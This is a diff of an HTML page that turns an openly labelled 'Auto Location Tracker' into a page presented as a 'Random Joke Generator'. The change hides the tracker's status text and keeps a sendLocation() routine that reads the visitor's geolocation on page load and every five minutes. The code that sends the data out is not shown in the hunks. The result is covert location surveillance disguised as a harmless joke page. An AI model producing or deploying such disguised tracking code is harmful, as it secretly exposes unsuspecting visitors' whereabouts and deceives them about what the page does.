@@ -1,13 +1,131 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Auto Location Tracker</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Random Joke Generator</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #ffecd2, #fcb69f);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      text-align: center;
+      background-color: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 600px;
+    }
+
+    h1 {
+      color: #ff6f61;
+    }
+
+    #joke-box {
+      background: #f9f9f9;
+      padding: 20px;
+      margin: 20px 0;
+      border-radius: 10px;
+      font-size: 1.2rem;
+      color: #333;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 1rem;
+      background-color: #ff6f61;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #e85c50;
+    }
+  </style>
 </head>
 <body>
-  <h2>Auto Location Tracker</h2>
-  <p>Status: <span id="status">Waiting...</span></p>
+  <p style="display: none;">Status: <span id="status">Waiting...</span></p>
+  <div class="container">
+    <h1>😂 Random Joke Generator</h1>
+    <div id="joke-box">
+      <p id="joke">Click the button to get a joke!</p>
+    </div>
+    <button onclick="showJoke()">Tell Me a Joke</button>
+  </div>
 
   <script>
+    const jokes = [
+      "Why don’t scientists trust atoms? Because they make up everything!",
+      "I told my computer I needed a break, and now it won’t stop sending me Kit-Kat ads.",
+      "Why did the scarecrow win an award? Because he was outstanding in his field.",
+      "Why don’t skeletons fight each other? They don’t have the guts.",
+      "Parallel lines have so much in common… it’s a shame they’ll never meet.",
+      "Why did the math book look sad? Because it had too many problems.",
+      "I only know 25 letters of the alphabet. I don't know y.",
+      "How do you organize a space party? You planet.",
+      "What do you call fake spaghetti? An impasta!",
+      "I would avoid the sushi if I were you. It’s a little fishy.",
+      "Why can't your nose be 12 inches long? Because then it would be a foot!",
+      "I'm reading a book on anti-gravity. It's impossible to put down!",
+      "I used to play piano by ear, but now I use my hands.",
+      "What’s orange and sounds like a parrot? A carrot.",
+      "Why did the coffee file a police report? It got mugged.",
+      "I’m on a seafood diet. I see food and I eat it.",
+      "Why was the broom late? It swept in.",
+      "Did you hear about the guy who invented Lifesavers? He made a mint!",
+      "Why did the cookie go to the hospital? It felt crummy.",
+      "What do you call a belt made of watches? A waist of time!",
+      "What do you call cheese that isn't yours? Nacho cheese.",
+      "Why was the stadium so cool? It was filled with fans.",
+      "I asked the dog what's two minus two. He said nothing.",
+      "Why did the golfer bring two pairs of pants? In case he got a hole in one.",
+      "How does a penguin build its house? Igloos it together.",
+      "What did the janitor say when he jumped out of the closet? Supplies!",
+      "What do you call a factory that makes okay products? A satisfactory.",
+      "Why did the bicycle fall over? It was two tired.",
+      "What lights up a soccer stadium? A soccer match.",
+      "What do you call a fish with no eyes? Fsh.",
+      "What’s brown and sticky? A stick.",
+      "Why couldn’t the leopard play hide and seek? Because he was always spotted.",
+      "What do you get if you cross a snowman and a dog? Frostbite.",
+      "Why did the tomato turn red? Because it saw the salad dressing!",
+      "What do you call a lazy kangaroo? A pouch potato.",
+      "How do cows stay up to date? They read the moos-paper.",
+      "What do you get when you cross a vampire with a snowman? Frostbite.",
+      "Why don’t some couples go to the gym? Because some relationships don’t work out.",
+      "What do you call a sleeping bull? A bulldozer.",
+      "What do you call an alligator in a vest? An investigator.",
+      "Why do ducks have tail feathers? To cover their buttquacks.",
+      "Why did the chicken join a band? Because it had the drumsticks.",
+      "Why did the man put his money in the freezer? He wanted cold hard cash.",
+      "Why did the cat sit on the computer? To keep an eye on the mouse.",
+      "How does the ocean say hi? It waves.",
+      "Why can’t you hear a pterodactyl go to the bathroom? Because the ‘P’ is silent.",
+      "What does a cloud wear under his raincoat? Thunderwear.",
+      "Why was the computer cold? It left its Windows open.",
+      "Why was the picture sent to jail? It was framed.",
+      "What kind of tree fits in your hand? A palm tree.",
+      "Why don’t eggs tell jokes? They’d crack each other up."
+    ];
+
+    function showJoke() {
+      const jokeElement = document.getElementById("joke");
+      const randomIndex = Math.floor(Math.random() * jokes.length);
+      jokeElement.innerText = jokes[randomIndex];
+    }
+
+
     function sendLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
@@ -39,7 +157,7 @@
 
     // Send location every 5 minutes
     sendLocation(); // Run immediately
-    setInterval(sendLocation, 5 * 60 * 1000); // Repeat every 5 min
+    setInterval(sendLocation, 5 * 60 * 1000); 
   </script>
 </body>
 </html>
